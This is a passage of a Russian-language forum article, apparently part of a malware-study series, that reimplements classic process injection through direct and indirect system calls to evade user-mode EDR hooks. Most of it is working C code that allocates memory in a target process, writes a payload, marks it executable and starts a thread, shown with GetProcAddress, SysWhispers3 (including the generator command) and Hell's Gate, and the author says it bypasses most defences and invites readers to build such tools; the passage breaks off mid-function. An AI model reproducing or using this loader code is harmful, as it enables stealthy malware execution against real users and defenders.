Чтобы вызвать системный вызов, сначала нужно передать номер системного вызова функции HellsGate. Это сохраняет его в глобальной переменной wSystemCall для будущего использования. Затем используется HellDescent для вызова системного вызова, передавая параметры системного вызова. Это демонстрируется в функции Payload.<br />
<br />
<b>Заключение</b><br />
<br />
Было показано, что обход хуков в пользовательском режиме возможен с помощью прямых системных вызовов, инструмента SysWhispers и техники &quot;Врата Ада&quot;.<br />
<br />
<b><span style="color: rgb(184, 49, 47)">В следующей статьи ранее реализованные техники инъекции процессов будут изменены для использования системных вызовов вместо WinAPI.<br />
В следующей статьи будет подробный разбор использования SysWhispers3 и HellsGate.</span></b></div>
						

							<h2>Предельная техника-2. Практика. Реализуем техники инъекции через сисколы</h2>

							

							

							<div class="bbWrapper"><div class="bbImageWrapper  js-lbImage" title="1746786715233.png"
		data-src="https://osint42.org/attachments/1746786715233-png.227/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746786715233-png.227/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746786715233.png"
			title="1746786715233.png"
			width="1280" height="720" loading="lazy" />
	</div><br />
<br />
В прошлой статье:Предельная техника. Разборка с сисколами | Цикл статей &quot;Изучение вредоносных программ&quot; мы разобрали теорию.<br />
<br />
Давайте теперь переделаем техники:<br />
<br />


<div class="embed fauxBlockLink" data-embed-content="ams_page-18" data-embed-content-url="https://bitsec42.org/ams/tsikl-statei-izucheniye-vredonosnykh-programm.6/page/izuchayem-tekhniku-thread-hijacking.18/">
	

<div class="embeddedAmsArticle block--messages">
	<div class="block-row block-row--separated" data-author="0x42">
		<div class="contentRow amsArticleSearchResultRow">
			
				<span class="contentRow-figure">
					
						<a href="page/izuchayem-tekhniku-thread-hijacking.18/index.html">
							<div class='amsThumbnail amsThumbnail--article'>
			<img class='amsThumbnail-image' src='../../data/attachments/0/121-5936b6a0fe070dbf88f407d1f35689b52cce.jpg?hash=xsuvKtBQ0o' loading='lazy' width='241' height='150' alt='Изучаем технику Thread Hijacking' />
			<span class='amsThumbnail-icon'></span>
			</div>
						</a>	
					
				</span>
			
			<div class="contentRow-main">
				<h3 class="contentRow-title">
					<a href="page/izuchayem-tekhniku-thread-hijacking.18/index.html"> Цикл статей &quot;Изучение вредоносных программ&quot; - Изучаем технику Thread Hijacking</a>
				</h3>

				<div class="contentRow-snippet">
					Thread Hijacking (Похищение потока) - это техника, позволяющая выполнять полезную нагрузку без создания нового потока. Этот метод работает путем приостановки потока и обновления регистра адреса команды, указывающего на следующую инструкцию в памяти, чтобы он указывал на начало полезной нагрузки...
				</div>

				<div class="contentRow-minor contentRow-minor--hideLinks">
					<ul class="listInline listInline--bullet">
						<li><a href="https://osint42.org/members/0x42.1/" class="username " dir="auto" data-user-id="1" data-xf-init="member-tooltip"><span class="username--moderator username--admin">0x42</span></a></li>
						<li><time  class="u-dt" dir="auto" datetime="2025-05-09T12:00:03+0300" data-timestamp="1746781203" data-date="09.05.2025" data-time="12:00" data-short="9 Май" title="09.05.2025 в 12:00">09.05.2025</time></li>
					</ul>
				</div>
			</div>
		</div>
	</div>
</div>
</div><br />


<div class="embed fauxBlockLink" data-embed-content="ams_page-22" data-embed-content-url="https://bitsec42.org/ams/tsikl-statei-izucheniye-vredonosnykh-programm.6/page/in-yektsiya-otobrazhayemoi-pamyati.22/">
	

<div class="embeddedAmsArticle block--messages">
	<div class="block-row block-row--separated" data-author="0x42">
		<div class="contentRow amsArticleSearchResultRow">
			
				<span class="contentRow-figure">
					
						<a href="page/in-yektsiya-otobrazhayemoi-pamyati.22/index.html">
							<div class='amsThumbnail amsThumbnail--article'>
			<img class='amsThumbnail-image' src='../../data/attachments/0/142-6b2a8f94002b22800112beedc28f81c8f6f2.jpg?hash=PUz950Z3C1' loading='lazy' width='618' height='150' alt='Инъекция отображаемой памяти' />
			<span class='amsThumbnail-icon'></span>
			</div>
						</a>	
					
				</span>
			
			<div class="contentRow-main">
				<h3 class="contentRow-title">
					<a href="page/in-yektsiya-otobrazhayemoi-pamyati.22/index.html"> Цикл статей &quot;Изучение вредоносных программ&quot; - Инъекция отображаемой памяти</a>
				</h3>

				<div class="contentRow-snippet">
					Локальная инъекция отображаемой памяти
Введение
До сих пор во всех предыдущих реализациях использовался тип локальной памяти для хранения полезной нагрузки во время выполнения. Локальная память выделяется с использованием VirtualAlloc или VirtualAllocEx.

На следующем изображении показана...
				</div>

				<div class="contentRow-minor contentRow-minor--hideLinks">
					<ul class="listInline listInline--bullet">
						<li><a href="https://osint42.org/members/0x42.1/" class="username " dir="auto" data-user-id="1" data-xf-init="member-tooltip"><span class="username--moderator username--admin">0x42</span></a></li>
						<li><time  class="u-dt" dir="auto" datetime="2025-05-09T12:37:35+0300" data-timestamp="1746783455" data-date="09.05.2025" data-time="12:37" data-short="9 Май" title="09.05.2025 в 12:37">09.05.2025</time></li>
					</ul>
				</div>
			</div>
		</div>
	</div>
</div>
</div><br />


<div class="embed fauxBlockLink" data-embed-content="ams_page-20" data-embed-content-url="https://bitsec42.org/ams/tsikl-statei-izucheniye-vredonosnykh-programm.6/page/izuchayem-tekhniku-apc-injection.20/">
	

<div class="embeddedAmsArticle block--messages">
	<div class="block-row block-row--separated" data-author="0x42">
		<div class="contentRow amsArticleSearchResultRow">
			
				<span class="contentRow-figure">
					
						<a href="page/izuchayem-tekhniku-apc-injection.20/index.html">
							<div class='amsThumbnail amsThumbnail--article'>
			<img class='amsThumbnail-image' src='../../data/attachments/0/134-37e964d2c7070e78abb7d7eea06206b0930b.jpg?hash=w6qNKrCkmc' loading='lazy' width='292' height='150' alt='Изучаем технику APC Injection' />
			<span class='amsThumbnail-icon'></span>
			</div>
						</a>	
					
				</span>
			
			<div class="contentRow-main">
				<h3 class="contentRow-title">
					<a href="page/izuchayem-tekhniku-apc-injection.20/index.html"> Цикл статей &quot;Изучение вредоносных программ&quot; - Изучаем технику APC Injection</a>
				</h3>

				<div class="contentRow-snippet">
					Предлагаю в этой статье рассмотреть один способ выполнения полезной нагрузки без создания нового потока. Этот метод известен как APC-инъекция.

Что такое APC? Асинхронные вызовы процедур (APC) — это механизм операционной системы Windows, который позволяет программам выполнять задачи асинхронно...
				</div>

				<div class="contentRow-minor contentRow-minor--hideLinks">
					<ul class="listInline listInline--bullet">
						<li><a href="https://osint42.org/members/0x42.1/" class="username " dir="auto" data-user-id="1" data-xf-init="member-tooltip"><span class="username--moderator username--admin">0x42</span></a></li>
						<li><time  class="u-dt" dir="auto" datetime="2025-05-09T12:30:01+0300" data-timestamp="1746783001" data-date="09.05.2025" data-time="12:30" data-short="9 Май" title="09.05.2025 в 12:30">09.05.2025</time></li>
					</ul>
				</div>
			</div>
		</div>
	</div>
</div>
</div><br />
С использованием косвенного вызова сискола, это поможет обойти большинство средств защиты.)<br />
<br />
Также это может послужить примером, как делать такие программы и вы можете уже сами реализовывать такие штуки в своих программах.)))<br />
<br />
<b><u>Итак начнем:</u><br />
<br />
1)Переписываем технику Изучаем технику Thread Hijacking | Цикл статей &quot;Изучение вредоносных программ&quot;<br />
<br />
Введение</b><br />
<br />
Классическая техника инъекции процессов, рассмотренная ранее, будет реализована с использованием прямых системных вызовов, заменяя WinAPI на их эквивалент в системных вызовах.<br />
<br />
VirtualAlloc/Ex заменяется на NtAllocateVirtualMemory<br />
<br />
VirtualProtect/Ex заменяется на NtProtectVirtualMemory<br />
<br />
WriteProcessMemory заменяется на NtWriteVirtualMemory<br />
<br />
CreateThread/RemoteThread заменяется на NtCreateThreadEx<br />
<br />
<b>Требуемые системные вызовы</b><br />
<br />
В этом разделе будут рассмотрены требуемые системные вызовы и их параметры.<br />
<br />
<b>NtAllocateVirtualMemory</b><br />
<br />
Это результат системного вызова из WinAPI-функций VirtualAlloc и VirtualAllocEx.<br />
NtAllocateVirtualMemory показан ниже.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>NTSTATUS NtAllocateVirtualMemory(
  IN HANDLE           ProcessHandle,    // Дескриптор процесса, в котором необходимо выделить память
  IN OUT PVOID        *BaseAddress,     // Возвращаемый базовый адрес выделенной памяти
  IN ULONG_PTR        ZeroBits,         // Всегда установите в &#039;0&#039;
  IN OUT PSIZE_T      RegionSize,       // Размер памяти для выделения
  IN ULONG            AllocationType,   // MEM_COMMIT | MEM_RESERVE
  IN ULONG            Protect           // Защита страницы
);</code></pre>
	</div>
</div><br />
NtAllocateVirtualMemory аналогичен WinAPI функции VirtualAllocEx. Однако он отличается тем, что параметры RegionSize и BaseAddress передаются по ссылке с использованием оператора адреса (&amp;).<br />
ZeroBits - это новый введенный параметр, который определяется как количество старших битов адреса, которые должны быть равны нулю в базовом адресе обзора секции. Этот параметр всегда устанавливается на ноль.<br />
<br />
Параметр RegionSize помечен как входной и выходной параметр. Это связано с тем, что значение RegionSize может изменяться в зависимости от того, что было фактически выделено. Microsoft утверждает, что начальное значение RegionSize указывает размер в байтах области, который округляется до следующей границы размера страницы хоста. Это означает, что NtAllocateVirtualMemory округляет до ближайшего кратного размера страницы, который составляет 4096 байт. Например, если RegionSize установлен на 5000 байт, он округлит его до 8192, и RegionSize вернет значение, которое было выделено, то есть 8192 в этом примере.<br />
<br />
Как уже упоминалось в предыдущих статьях, все системные вызовы возвращают NTSTATUS. Если выполнение успешно, он устанавливается в STATUS_SUCCESS (0). В противном случае, если системный вызов не удается, возвращается ненулевое значение.<br />
<br />
<b>NtProtectVirtualMemory</b><br />
<br />
Это результат системного вызова из WinAPI-функций VirtualProtect и VirtualProtectEx. NtProtectVirtualMemory показан ниже.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>NTSTATUS NtProtectVirtualMemory(
  IN HANDLE               ProcessHandle,              // Дескриптор процесса, защита памяти которого должна быть изменена
  IN OUT PVOID            *BaseAddress,               // Указатель на базовый адрес для защиты
  IN OUT PULONG           NumberOfBytesToProtect,     // Указатель на размер области для защиты
  IN ULONG                NewAccessProtection,        // Новая устанавливаемая защита памяти
  OUT PULONG              OldAccessProtection         // Указатель на переменную, которая получает предыдущую защиту доступа
);</code></pre>
	</div>
</div><br />
Оба параметра BaseAddress и NumberOfBytesToProtect передаются по ссылке с использованием оператора &quot;адрес&quot;.<br />
<br />
Параметр NumberOfBytesToProtect ведет себя аналогично параметру RegionSize в NtAllocateVirtualMemory, округляя количество байтов до ближайшего кратного размера страницы.<br />
<br />
<b>NtWriteVirtualMemory</b><br />
<br />
Это результат системного вызова из WinAPI-функции WriteProcessMemory. NtWriteVirtualMemory показан ниже.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>NTSTATUS NtWriteVirtualMemory(
  IN HANDLE               ProcessHandle,          // Дескриптор процесса, память которого должна быть записана
  IN PVOID                BaseAddress,            // Базовый адрес в указанном процессе, в который записываются данные
  IN PVOID                Buffer,                 // Данные для записи
  IN ULONG                NumberOfBytesToWrite,   // Количество байтов для записи
  OUT PULONG              NumberOfBytesWritten    // Указатель на переменную, которая получает количество фактически записанных байтов
);</code></pre>
	</div>
</div><br />
Параметры NtWriteVirtualMemory такие же, как и у его версии WinAPI, WriteProcessMemory.<br />
<br />
<b>NtCreateThreadEx</b><br />
<br />
Это результат системного вызова из WinAPI-функций CreateThread, CreateRemoteThread и CreateRemoteThreadEx. NtCreateThreadEx показан ниже.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>NTSTATUS NtCreateThreadEx(
    OUT PHANDLE                 ThreadHandle,         // Указатель на переменную HANDLE, которая получает дескриптор созданного потока
    IN     ACCESS_MASK             DesiredAccess,        // Права доступа к потоку (устанавливаются в THREAD_ALL_ACCESS - 0x1FFFFF)
    IN     POBJECT_ATTRIBUTES      ObjectAttributes,     // Указатель на структуру OBJECT_ATTRIBUTES (устанавливается в NULL)
    IN     HANDLE                  ProcessHandle,        // Дескриптор процесса, в котором должен быть создан поток
    IN     PVOID                   StartRoutine,         // Базовый адрес определяемой приложением функции, которая будет выполняться
    IN     PVOID                   Argument,             // Указатель на переменную, которая передается функции потока (устанавливается в NULL)
    IN     ULONG                   CreateFlags,          // Флаги, которые управляют созданием потока (устанавливаются в NULL)
    IN     SIZE_T                  ZeroBits,             // Устанавливаются в NULL
    IN     SIZE_T                  StackSize,            // Устанавливаются в NULL
    IN     SIZE_T                  MaximumStackSize,     // Устанавливаются в NULL
    IN     PPS_ATTRIBUTE_LIST      AttributeList         // Указатель на структуру PS_ATTRIBUTE_LIST (устанавливаются в NULL)
);</code></pre>
	</div>
</div><br />
NtCreateThreadEx похож на WinAPI функцию CreateRemoteThreadEx. NtCreateThreadEx - это очень гибкий системный вызов и может позволить сложное управление созданными потоками. Однако для наших целей большинство его параметров будут установлены на NULL.<br />
<br />
<b>Реализация с использованием GetProcAddress и GetModuleHandle</b><br />
<br />
Вызов системных вызовов будет выполнен с использованием нескольких методов, начиная с обычно используемыми WinAPI-функциями GetProcAddress и GetModuleHandle. Этот метод прост и был использован многократно для динамического вызова системных вызовов. Однако, как уже обсуждалось ранее, этот метод не обходит пользовательские хуки, установленные на системные вызовы.<br />
<br />
В предоставленном создается структура Syscall и инициализируется с помощью InitializeSyscallStruct, которая содержит адреса используемых системных вызовов, как показано ниже.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// Структура, которая хранит используемые системные вызовы
typedef struct _Syscall {

    fnNtAllocateVirtualMemory pNtAllocateVirtualMemory;
    fnNtProtectVirtualMemory  pNtProtectVirtualMemory;
    fnNtWriteVirtualMemory    pNtWriteVirtualMemory;
    fnNtCreateThreadEx        pNtCreateThreadEx;

} Syscall, *PSyscall;


// Функция, используемая для заполнения входной структуры &#039;St&#039;
BOOL InitializeSyscallStruct (OUT PSyscall St) {

    HMODULE hNtdll = GetModuleHandle(L&quot;NTDLL.DLL&quot;);
    if (!hNtdll) {
        printf(&quot;[!] GetModuleHandle Failed With Error : %d \n&quot;, GetLastError());
        return FALSE;
    }

    St-&gt;pNtAllocateVirtualMemory  = (fnNtAllocateVirtualMemory)GetProcAddress(hNtdll, &quot;NtAllocateVirtualMemory&quot;);
    St-&gt;pNtProtectVirtualMemory   = (fnNtProtectVirtualMemory)GetProcAddress(hNtdll, &quot;NtProtectVirtualMemory&quot;);
    St-&gt;pNtWriteVirtualMemory     = (fnNtWriteVirtualMemory)GetProcAddress(hNtdll, &quot;NtWriteVirtualMemory&quot;);
    St-&gt;pNtCreateThreadEx         = (fnNtCreateThreadEx)GetProcAddress(hNtdll, &quot;NtCreateThreadEx&quot;);

        // проверка, пропустил ли GetProcAddress системный вызов
    if (St-&gt;pNtAllocateVirtualMemory == NULL || St-&gt;pNtProtectVirtualMemory == NULL || St-&gt;pNtWriteVirtualMemory == NULL || St-&gt;pNtCreateThreadEx == NULL)
        return FALSE;
    else
        return TRUE;
}</code></pre>
	</div>
</div><br />
Далее функция ClassicInjectionViaSyscalls будет ответственна за выполнение полезной нагрузки, pPayload, в целевом процессе, hProcess. Функция возвращает FALSE, если не удалось выполнить полезную нагрузку, и TRUE, если удалось. Кроме того, функция может использоваться для инъекции как в локальные, так и в удаленные процессы, в зависимости от значения hProcess.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL ClassicInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN SIZE_T sPayloadSize) {


    Syscall   St                     = { 0 };
    NTSTATUS  STATUS                 = 0x00;
    PVOID     pAddress               = NULL;
    ULONG     uOldProtection         = NULL;

    SIZE_T    sSize                  = sPayloadSize,
              sNumberOfBytesWritten    = NULL;
    HANDLE    hThread                = NULL;

    // Инициализация структуры &#039;St&#039; для получения адресов системных вызовов
    if (!InitializeSyscallStruct(&amp;St)){
        printf(&quot;[!] Could Not Initialize The Syscall Struct \n&quot;);
        return FALSE;
    }

//--------------------------------------------------------------------------

    // Выделение памяти
    if ((STATUS = St.pNtAllocateVirtualMemory(hProcess, &amp;pAddress, 0, &amp;sSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) != 0) {
        printf(&quot;[!] NtAllocateVirtualMemory Failed With Error : 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    printf(&quot;[+] Allocated Address At : 0x%p Of Size : %d \n&quot;, pAddress, sSize);
    printf(&quot;[#] Press &lt;Enter&gt; To Write The Payload ... &quot;);
    getchar();

//--------------------------------------------------------------------------

    // Запись полезной нагрузки
    printf(&quot;\t[i] Writing Payload Of Size %d ... &quot;, sPayloadSize);
    if ((STATUS = St.pNtWriteVirtualMemory(hProcess, pAddress, pPayload, sPayloadSize, &amp;sNumberOfBytesWritten)) != 0 || sNumberOfBytesWritten != sPayloadSize) {
        printf(&quot;[!] pNtWriteVirtualMemory Failed With Error : 0x%0.8X \n&quot;, STATUS);
        printf(&quot;[i] Bytes Written : %d of %d \n&quot;, sNumberOfBytesWritten, sPayloadSize);
        return FALSE;
    }
    printf(&quot;[+] DONE \n&quot;);

//--------------------------------------------------------------------------

    // Изменение разрешений памяти на RWX
    if ((STATUS = St.pNtProtectVirtualMemory(hProcess, &amp;pAddress, &amp;sPayloadSize, PAGE_EXECUTE_READWRITE, &amp;uOldProtection)) != 0) {
        printf(&quot;[!] NtProtectVirtualMemory Failed With Error : 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

//--------------------------------------------------------------------------
    // Выполнение полезной нагрузки через поток
    printf(&quot;[#] Press &lt;Enter&gt; To Run The Payload ... &quot;);
    getchar();
    printf(&quot;\t[i] Running Thread Of Entry 0x%p ... &quot;, pAddress);
    if ((STATUS = St.pNtCreateThreadEx(&amp;hThread, THREAD_ALL_ACCESS, NULL, hProcess, pAddress, NULL, NULL, NULL, NULL, NULL, NULL)) != 0) {
        printf(&quot;[!] NtCreateThreadEx Failed With Error : 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    printf(&quot;[+] DONE \n&quot;);
    printf(&quot;\t[+] Thread Created With Id : %d \n&quot;, GetThreadId(hThread));

    return TRUE;
}</code></pre>
	</div>
</div><br />
<b>Размер полезной нагрузки и округление в большую сторону</b><br />
<br />
Помните, что NtAllocateVirtualMemory округляет значение RegionSize до кратного 4096. Из-за округления размера необходимо быть осторожным при использовании одной и той же переменной размера полезной нагрузки при выделении памяти и записи в память, так как это может привести к записи большего количества байтов, чем предполагалось. Именно поэтому в вышеприведенном коде используются разные переменные размера для NtAllocateVirtualMemory и NtWriteVirtualMemory.<br />
<br />
Проблема демонстрируется в приведенном ниже фрагменте кода.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>  // sPayloadSize - это размер полезной нагрузки (272 байта)
  // Выделение памяти
  if ((STATUS = St.pNtAllocateVirtualMemory(hProcess, &amp;pAddress, 0, &amp;sPayloadSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) != 0) {
    return FALSE;
  }

  // значение sPayloadSize теперь равно 4096
  // Запись полезной нагрузки с sPayloadSize (NumberOfBytesToWrite) равным 4096 вместо исходного размера
  if ((STATUS = St.pNtWriteVirtualMemory(hProcess, pAddress, pPayload, sPayloadSize, &amp;sNumberOfBytesWritten)) != 0) {
    return FALSE;
  }</code></pre>
	</div>
</div><br />
<b>Реализация с использованием SysWhispers3</b><br />
<br />
Реализация здесь использует<a href="https://github.com/klezVirus/SysWhispers3" target="_blank" class="link link--external" rel="noopener"> SysWhispers3</a> для обхода пользовательских хуков <b>через косвенные системные вызовы.</b> Следующая команда используется для генерации необходимых файлов для этой реализации.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>python syswhispers.py -a x64 -c msvc -m jumper_randomized -f NtAllocateVirtualMemory,NtProtectVirtualMemory,NtWriteVirtualMemory,NtCreateThreadEx -o SysWhispers -v</code></pre>
	</div>
</div><br />
Создаются три файла: SysWhispers.h, SysWhispers.c и SysWhispers-asm.x64.asm.<br />
<br />
Следующий шаг - импортировать эти файлы в Visual Studio, как указано в Readme SysWhisper.<br />
<br />
Шаги демонстрируются ниже.<br />
<br />
<b>Шаг 1</b> Скопируйте сгенерированные файлы в папку проекта, затем добавьте их в проект Visual Studio как существующие элементы.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746786750819.png"
		data-src="https://osint42.org/attachments/1746786750819-png.228/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746786750819-png.228/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746786750819.png"
			title="1746786750819.png"
			width="779" height="553" loading="lazy" />
	</div><br />
<br />
<b>Шаг 2</b> Включите MASM в проекте, чтобы разрешить компиляцию сгенерированного кода на ассемблере.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746786757113.png"
		data-src="https://osint42.org/attachments/1746786757113-png.229/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746786757113-png.229/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746786757113.png"
			title="1746786757113.png"
			width="785" height="720" loading="lazy" />
	</div><br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746786763384.png"
		data-src="https://osint42.org/attachments/1746786763384-png.230/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746786763384-png.230/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746786763384.png"
			title="1746786763384.png"
			width="777" height="634" loading="lazy" />
	</div><br />
<br />
<b>Шаг 3</b> Измените свойства, чтобы установить файл ASM на компиляцию с использованием Microsoft Macro Assembler.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746786769176.png"
		data-src="https://osint42.org/attachments/1746786769176-png.231/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746786769176-png.231/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746786769176.png"
			title="1746786769176.png"
			width="803" height="680" loading="lazy" />
	</div><br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746786775047.png"
		data-src="https://osint42.org/attachments/1746786775047-png.232/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746786775047-png.232/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746786775047.png"
			title="1746786775047.png"
			width="809" height="580" loading="lazy" />
	</div><br />
<br />
<b>Шаг 4</b> Теперь проект Visual Studio может быть скомпилирован. Функция ClassicInjectionViaSyscalls показана ниже.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL ClassicInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN SIZE_T sPayloadSize) {


    NTSTATUS    STATUS                  = 0x00;
    PVOID        pAddress                = NULL;
    ULONG        uOldProtection          = NULL;

    SIZE_T        sSize                   = sPayloadSize,
                sNumberOfBytesWritten   = NULL;
    HANDLE        hThread                    = NULL;



    // Allocating memory
    if ((STATUS = NtAllocateVirtualMemory(hProcess, &amp;pAddress, 0, &amp;sSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) != 0) {
        printf(&quot;[!] NtAllocateVirtualMemory Failed With Error : 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }
    printf(&quot;[+] Allocated Address At : 0x%p Of Size : %d \n&quot;, pAddress, sSize);
    printf(&quot;[#] Press &lt;Enter&gt; To Write The Payload ... &quot;);
    getchar();

//--------------------------------------------------------------------------
    // Writing the payload
    printf(&quot;\t[i] Writing Payload Of Size %d ... &quot;, sPayloadSize);
    if ((STATUS = NtWriteVirtualMemory(hProcess, pAddress, pPayload, sPayloadSize, &amp;sNumberOfBytesWritten)) != 0 || sNumberOfBytesWritten != sPayloadSize) {
        printf(&quot;[!] pNtWriteVirtualMemory Failed With Error : 0x%0.8X \n&quot;, STATUS);
        printf(&quot;[i] Bytes Written : %d of %d \n&quot;, sNumberOfBytesWritten, sPayloadSize);
        return FALSE;
    }
    printf(&quot;[+] DONE \n&quot;);

//--------------------------------------------------------------------------
    // Changing the memory&#039;s permissions to RWX
    if ((STATUS = NtProtectVirtualMemory(hProcess, &amp;pAddress, &amp;sPayloadSize, PAGE_EXECUTE_READWRITE, &amp;uOldProtection)) != 0) {
        printf(&quot;[!] NtProtectVirtualMemory Failed With Error : 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

//--------------------------------------------------------------------------
    // Executing the payload via thread
    printf(&quot;[#] Press &lt;Enter&gt; To Run The Payload ... &quot;);
    getchar();
    printf(&quot;\t[i] Running Thread Of Entry 0x%p ... &quot;, pAddress);
    if ((STATUS = NtCreateThreadEx(&amp;hThread, THREAD_ALL_ACCESS, NULL, hProcess, pAddress, NULL, NULL, NULL, NULL, NULL, NULL)) != 0) {
        printf(&quot;[!] NtCreateThreadEx Failed With Error : 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }
    printf(&quot;[+] DONE \n&quot;);
    printf(&quot;\t[+] Thread Created With Id : %d \n&quot;, GetThreadId(hThread));

    return TRUE;
}</code></pre>
	</div>
</div><br />
<b>Реализация с использованием </b><a href="https://github.com/am0nsec/HellsGate" target="_blank" class="link link--external" rel="noopener"><b>Hell&#039;s Gate</b></a><br />
<br />
Последняя реализация для этого модуля использует Hell&#039;s Gate. Сначала убедитесь, что те же шаги, которые были выполнены для настройки проекта Visual Studio с SysWhispers3, выполняются и здесь. В частности, включение MASM и изменение свойств для установки файла ASM на компиляцию с использованием Microsoft Macro Assembler.<br />
<br />
<b>Изменение функции полезной нагрузки</b><br />
<br />
Необходимо внести несколько изменений в код Hell&#039;s Gate. Сначала функция <a href="https://github.com/am0nsec/HellsGate/blob/master/HellsGate/main.c#L166" target="_blank" class="link link--external" rel="noopener">Payload</a> должна быть заменена функцией ClassicInjectionViaSyscalls.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL ClassicInjectionViaSyscalls(IN PVX_TABLE pVxTable, IN HANDLE hProcess, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {

    NTSTATUS    STATUS                  = 0x00;
    PVOID        pAddress                = NULL;
    ULONG        uOldProtection          = NULL;

    SIZE_T        sSize                   = sPayloadSize,
                sNumberOfBytesWritten   = NULL;
    HANDLE        hThread                    = NULL;


    // Allocating memory
    HellsGate(pVxTable-&gt;NtAllocateVirtualMemory.wSystemCall);
    if ((STATUS = HellDescent(hProcess, &amp;pAddress, 0, &amp;sSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) != 0) {
        printf(&quot;[!] NtAllocateVirtualMemory Failed With Error : 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    printf(&quot;[+] Allocated Address At : 0x%p Of Size : %d \n&quot;, pAddress, sSize);
    printf(&quot;[#] Press &lt;Enter&gt; To Write The Payload ... &quot;);
    getchar();

//--------------------------------------------------------------------------

    // Writing the payload
    printf(&quot;\t[i] Writing Payload Of Size %d ... &quot;, sPayloadSize);
    HellsGate(pVxTable-&gt;NtWriteVirtualMemory.wSystemCall);
